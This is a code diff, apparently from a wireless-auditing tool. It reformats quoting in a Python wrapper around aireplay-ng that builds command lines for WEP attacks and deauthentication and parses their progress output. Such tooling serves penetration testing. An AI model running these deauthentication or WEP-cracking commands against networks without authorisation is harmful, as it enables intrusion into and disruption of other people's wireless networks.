@@ -36,7 +36,7 @@ class WEPAttackType(object):
                         self.name = name
                         self.value = value
                         return
-            raise Exception("Attack number %d not found" % var)
+            raise Exception('Attack number %d not found' % var)
         elif type(var) is str:
             for (name,value) in WEPAttackType.__dict__.items():
                 if type(value) is int:
@@ -44,12 +44,12 @@ class WEPAttackType(object):
                         self.name = name
                         self.value = value
                         return
-            raise Exception("Attack name %s not found" % var)
+            raise Exception('Attack name %s not found' % var)
         elif type(var) == WEPAttackType:
             self.name = var.name
             self.value = var.value
         else:
-            raise Exception("Attack type not supported")
+            raise Exception('Attack type not supported')
 
     def __str__(self):
         return self.name
@@ -65,13 +65,13 @@ class Aireplay(Thread, Dependency):
             Starts aireplay process.
             Args:
                 target - Instance of Target object, AP to attack.
-                attack_type - str, e.g. "fakeauth", "arpreplay", etc.
+                attack_type - str, e.g. 'fakeauth', 'arpreplay', etc.
                 client_mac - MAC address of an associated client.
         '''
         super(Aireplay, self).__init__() # Init the parent Thread
 
         self.target = target
-        self.output_file = Configuration.temp("aireplay_%s.output" % attack_type)
+        self.output_file = Configuration.temp('aireplay_%s.output' % attack_type)
         self.attack_type = WEPAttackType(attack_type).value
         self.error = None
         self.status = None
@@ -90,7 +90,7 @@ class Aireplay(Thread, Dependency):
 
     def stop(self):
         ''' Stops aireplay process '''
-        if hasattr(self, "pid") and self.pid and self.pid.poll() is None:
+        if hasattr(self, 'pid') and self.pid and self.pid.poll() is None:
             self.pid.interrupt()
 
     def get_output(self):
@@ -104,7 +104,7 @@ class Aireplay(Thread, Dependency):
             time.sleep(0.1)
             if not os.path.exists(self.output_file): continue
             # Read output file & clear output file
-            with open(self.output_file, "r+") as fid:
+            with open(self.output_file, 'r+') as fid:
                 lines = fid.read()
                 self.stdout += lines
                 fid.seek(0)
@@ -114,51 +114,51 @@ class Aireplay(Thread, Dependency):
                 from ..util.color import Color
                 Color.pl('\n{P} [?] aireplay output:\n     %s{W}' % lines.strip().replace('\n', '\n     '))
 
-            for line in lines.split("\n"):
-                line = line.replace("\r", "").strip()
-                if line == "": continue
-                if "Notice: got a deauth/disassoc packet" in line:
-                    self.error = "Not associated (needs fakeauth)"
+            for line in lines.split('\n'):
+                line = line.replace('\r', '').strip()
+                if line == '': continue
+                if 'Notice: got a deauth/disassoc packet' in line:
+                    self.error = 'Not associated (needs fakeauth)'
 
                 if self.attack_type == WEPAttackType.fakeauth:
                     # Look for fakeauth status. Potential Output lines:
                     # (START): 00:54:58  Sending Authentication Request (Open System)
-                    if "Sending Authentication Request " in line:
+                    if 'Sending Authentication Request ' in line:
                         self.status = None # Reset
                     # (????):  Please specify an ESSID (-e).
-                    elif "Please specify an ESSID" in line:
+                    elif 'Please specify an ESSID' in line:
                         self.status = None
                     # (FAIL):  00:57:43  Got a deauthentication packet! (Waiting 3 seconds)
-                    elif "Got a deauthentication packet!" in line:
+                    elif 'Got a deauthentication packet!' in line:
                         self.status = False
                     # (PASS):  20:17:25  Association successful :-) (AID: 1)
                     # (PASS):  20:18:55  Reassociation successful :-) (AID: 1)
-                    elif "association successful :-)" in line.lower():
+                    elif 'association successful :-)' in line.lower():
                         self.status = True
                 elif self.attack_type == WEPAttackType.chopchop:
                     # Look for chopchop status. Potential output lines:
 
                     # (START)  Read 178 packets...
-                    read_re = re.compile(r"Read (\d+) packets")
+                    read_re = re.compile(r'Read (\d+) packets')
                     matches = read_re.match(line)
                     if matches:
-                        self.status = "Waiting for packet (read %s)..." % matches.group(1)
+                        self.status = 'Waiting for packet (read %s)...' % matches.group(1)
 
                     # Sent 1912 packets, current guess: 70...
-                    sent_re = re.compile(r"Sent (\d+) packets, current guess: (\w+)...")
+                    sent_re = re.compile(r'Sent (\d+) packets, current guess: (\w+)...')
                     matches = sent_re.match(line)
                     if matches:
-                        self.status = "Generating .xor (%s)... current guess: %s" % (self.xor_percent, matches.group(2))
-                    
+                        self.status = 'Generating .xor (%s)... current guess: %s' % (self.xor_percent, matches.group(2))
+
                     # (DURING) Offset   52 (54% done) | xor = DE | pt = E0 |  152 frames written in  2782ms
-                    offset_re = re.compile(r"Offset.*\(\s*(\d+%) done\)")
+                    offset_re = re.compile(r'Offset.*\(\s*(\d+%) done\)')
                     matches = offset_re.match(line)
                     if matches:
                         self.xor_percent = matches.group(1)
-                        self.status = "Generating .xor (%s)..." % self.xor_percent
+                        self.status = 'Generating .xor (%s)...' % self.xor_percent
 
                     # (DONE)   Saving keystream in replay_dec-0516-202246.xor
-                    saving_re = re.compile(r"Saving keystream in (.*\.xor)")
+                    saving_re = re.compile(r'Saving keystream in (.*\.xor)')
                     matches = saving_re.match(line)
                     if matches:
                         self.status = matches.group(1)
@@ -171,17 +171,17 @@ class Aireplay(Thread, Dependency):
                     # Parse fragment output, update self.status
 
                     # (START)  Read 178 packets...
-                    read_re = re.compile(r"Read (\d+) packets")
+                    read_re = re.compile(r'Read (\d+) packets')
                     matches = read_re.match(line)
                     if matches:
-                        self.status = "Waiting for packet (read %s)..." % matches.group(1)
+                        self.status = 'Waiting for packet (read %s)...' % matches.group(1)
 
                     # 01:08:15  Waiting for a data packet...
                     if 'Waiting for a data packet' in line:
                         self.status = 'waiting for packet'
-                    
+
                     # Read 207 packets...
-                    trying_re = re.compile(r"Trying to get (\d+) bytes of a keystream")
+                    trying_re = re.compile(r'Trying to get (\d+) bytes of a keystream')
                     matches = trying_re.match(line)
                     if matches:
                         self.status = 'trying to get %sb of a keystream' % matches.group(1)
@@ -195,7 +195,7 @@ class Aireplay(Thread, Dependency):
                         self.status = 'sending another packet'
 
                     # XX:XX:XX  Trying to get 1500 bytes of a keystream
-                    trying_re = re.compile(r"Trying to get (\d+) bytes of a keystream")
+                    trying_re = re.compile(r'Trying to get (\d+) bytes of a keystream')
                     matches = trying_re.match(line)
                     if matches:
                         self.status = 'trying to get %sb of a keystream' % matches.group(1)
@@ -209,7 +209,7 @@ class Aireplay(Thread, Dependency):
                         self.status = 'relayed packet was our'
 
                     # XX:XX:XX  Saving keystream in fragment-0124-161129.xor
-                    saving_re = re.compile(r"Saving keystream in (.*\.xor)")
+                    saving_re = re.compile(r'Saving keystream in (.*\.xor)')
                     matches = saving_re.match(line)
                     if matches:
                         self.status = 'saving keystream to %s' % matches.group(1)
@@ -220,14 +220,14 @@ class Aireplay(Thread, Dependency):
                     # Parse Packets Sent & PacketsPerSecond. Possible output lines:
                     # Read 55 packets (got 0 ARP requests and 0 ACKs), sent 0 packets...(0 pps)
                     # Read 4467 packets (got 1425 ARP requests and 1417 ACKs), sent 1553 packets...(100 pps)
-                    read_re = re.compile(r"Read (\d+) packets \(got (\d+) ARP requests and (\d+) ACKs\), sent (\d+) packets...\((\d+) pps\)")
+                    read_re = re.compile(r'Read (\d+) packets \(got (\d+) ARP requests and (\d+) ACKs\), sent (\d+) packets...\((\d+) pps\)')
                     matches = read_re.match(line)
                     if matches:
                         pps = matches.group(5)
-                        if pps == "0":
-                            self.status = "Waiting for packet..."
+                        if pps == '0':
+                            self.status = 'Waiting for packet...'
                         else:
-                            self.status = "Replaying @ %s/sec" % pps
+                            self.status = 'Replaying @ %s/sec' % pps
                     pass
 
     def __del__(self):
@@ -248,10 +248,10 @@ class Aireplay(Thread, Dependency):
         # Interface is required at this point
         Configuration.initialize()
         if Configuration.interface is None:
-            raise Exception("Wireless interface must be defined (-i)")
+            raise Exception('Wireless interface must be defined (-i)')
 
-        cmd = ["aireplay-ng"]
-        cmd.append("--ignore-negative-one")
+        cmd = ['aireplay-ng']
+        cmd.append('--ignore-negative-one')
 
         if client_mac is None and len(target.clients) > 0:
             # Client MAC wasn't specified, but there's an associated client. Use that.
@@ -263,87 +263,87 @@ class Aireplay(Thread, Dependency):
 
         if attack_type == WEPAttackType.fakeauth:
             cmd.extend([
-                "--fakeauth", "30", # Fake auth every 30 seconds
-                "-Q", # Send re-association packets
-                "-a", target.bssid
+                '--fakeauth', '30', # Fake auth every 30 seconds
+                '-Q', # Send re-association packets
+                '-a', target.bssid
             ])
             if target.essid_known:
-                cmd.extend(["-e", target.essid])
+                cmd.extend(['-e', target.essid])
         elif attack_type == WEPAttackType.replay:
             cmd.extend([
-                "--arpreplay",
-                "-b", target.bssid,
-                "-x", str(Configuration.wep_pps)
+                '--arpreplay',
+                '-b', target.bssid,
+                '-x', str(Configuration.wep_pps)
             ])
             if client_mac:
-                cmd.extend(["-h", client_mac])
+                cmd.extend(['-h', client_mac])
 
         elif attack_type == WEPAttackType.chopchop:
             cmd.extend([
-                "--chopchop",
-                "-b", target.bssid,
-                "-x", str(Configuration.wep_pps),
-                #"-m", "60", # Minimum packet length (bytes)
-                #"-n", "82", # Maximum packet length
-                "-F"        # Automatically choose first packet
+                '--chopchop',
+                '-b', target.bssid,
+                '-x', str(Configuration.wep_pps),
+                #'-m', '60', # Minimum packet length (bytes)
+                #'-n', '82', # Maximum packet length
+                '-F'        # Automatically choose first packet
             ])
             if client_mac:
-                cmd.extend(["-h", client_mac])
+                cmd.extend(['-h', client_mac])
 
         elif attack_type == WEPAttackType.fragment:
             cmd.extend([
-                "--fragment",
-                "-b", target.bssid,
-                "-x", str(Configuration.wep_pps),
-                "-m", "100", # Minimum packet length (bytes)
-                "-F"         # Automatically choose first packet
+                '--fragment',
+                '-b', target.bssid,
+                '-x', str(Configuration.wep_pps),
+                '-m', '100', # Minimum packet length (bytes)
+                '-F'         # Automatically choose first packet
             ])
             if client_mac:
-                cmd.extend(["-h", client_mac])
+                cmd.extend(['-h', client_mac])
 
         elif attack_type == WEPAttackType.caffelatte:
             if len(target.clients) == 0:
                 # Unable to carry out caffe-latte attack
-                raise Exception("Client is required for caffe-latte attack")
+                raise Exception('Client is required for caffe-latte attack')
             cmd.extend([
-                "--caffe-latte",
-                "-b", target.bssid,
-                "-h", target.clients[0].station
+                '--caffe-latte',
+                '-b', target.bssid,
+                '-h', target.clients[0].station
             ])
 
         elif attack_type == WEPAttackType.p0841:
             cmd.extend([
-                "--arpreplay",
-                "-b", target.bssid,
-                "-c", "ff:ff:ff:ff:ff:ff",
-                "-x", str(Configuration.wep_pps),
-                "-F", # Automatically choose first packet
-                "-p", "0841"
+                '--arpreplay',
+                '-b', target.bssid,
+                '-c', 'ff:ff:ff:ff:ff:ff',
+                '-x', str(Configuration.wep_pps),
+                '-F', # Automatically choose first packet
+                '-p', '0841'
             ])
             if client_mac:
-                cmd.extend(["-h", client_mac])
+                cmd.extend(['-h', client_mac])
 
         elif attack_type == WEPAttackType.hirte:
             if client_mac is None:
                 # Unable to carry out hirte attack
-                raise Exception("Client is required for hirte attack")
+                raise Exception('Client is required for hirte attack')
             cmd.extend([
-                "--cfrag",
-                "-h", client_mac
+                '--cfrag',
+                '-h', client_mac
             ])
         elif attack_type == WEPAttackType.forgedreplay:
             if client_mac is None or replay_file is None:
-                raise Exception("Client_mac and Replay_File are required for arp replay")
+                raise Exception('Client_mac and Replay_File are required for arp replay')
             cmd.extend([
-                "--arpreplay",
-                "-b", target.bssid,
-                "-h", client_mac,
-                "-r", replay_file,
-                "-F", # Automatically choose first packet
-                "-x", str(Configuration.wep_pps)
+                '--arpreplay',
+                '-b', target.bssid,
+                '-h', client_mac,
+                '-r', replay_file,
+                '-F', # Automatically choose first packet
+                '-x', str(Configuration.wep_pps)
             ])
         else:
-            raise Exception("Unexpected attack type: %s" % attack_type)
+            raise Exception('Unexpected attack type: %s' % attack_type)
 
         cmd.append(Configuration.interface)
         return cmd
@@ -388,18 +388,18 @@ class Aireplay(Thread, Dependency):
     def deauth(target_bssid, essid=None, client_mac=None, num_deauths=None, timeout=2):
         num_deauths = num_deauths or Configuration.num_deauths
         deauth_cmd = [
-            "aireplay-ng",
-            "-0", # Deauthentication
+            'aireplay-ng',
+            '-0', # Deauthentication
             str(num_deauths),
-            "--ignore-negative-one",
-            "-a", target_bssid, # Target AP
-            "-D" # Skip AP detection
+            '--ignore-negative-one',
+            '-a', target_bssid, # Target AP
+            '-D' # Skip AP detection
         ]
         if client_mac is not None:
             # Station-specific deauth
-            deauth_cmd.extend(["-c", client_mac])
+            deauth_cmd.extend(['-c', client_mac])
         if essid:
-            deauth_cmd.extend(["-e", essid])
+            deauth_cmd.extend(['-e', essid])
         deauth_cmd.append(Configuration.interface)
         proc = Process(deauth_cmd)
         while proc.poll() is None:
@@ -450,23 +450,3 @@ if __name__ == '__main__':
     t = WEPAttackType(t)
     print(t.name, type(t.name), t.value)
 
-    from ..model.target import Target
-    fields = 'A4:2B:8C:16:6B:3A, 2015-05-27 19:28:44, 2015-05-27 19:28:46,  6,  54e, WEP, WEP, , -58,        2,        0,   0.  0.  0.  0,   9, Test Router Please Ignore, '.split(',')
-    t = Target(fields)
-
-    '''
-    aireplay = Aireplay(t, 'replay')
-    while aireplay.is_running():
-        from time import sleep
-        sleep(0.1)
-    stdout, stderr = aireplay.get_output()
-    print("STDOUT>", stdout)
-    print("STDERR>", stderr)
-    '''
-
-    '''
-    forge = Aireplay.forge_packet('/tmp/replay_dec-0605-060243.xor', \
-                                  'A4:2B:8C:16:6B:3A', \
-                                  '00:C0:CA:4E:CA:E0')
-    print(forge)
-    '''
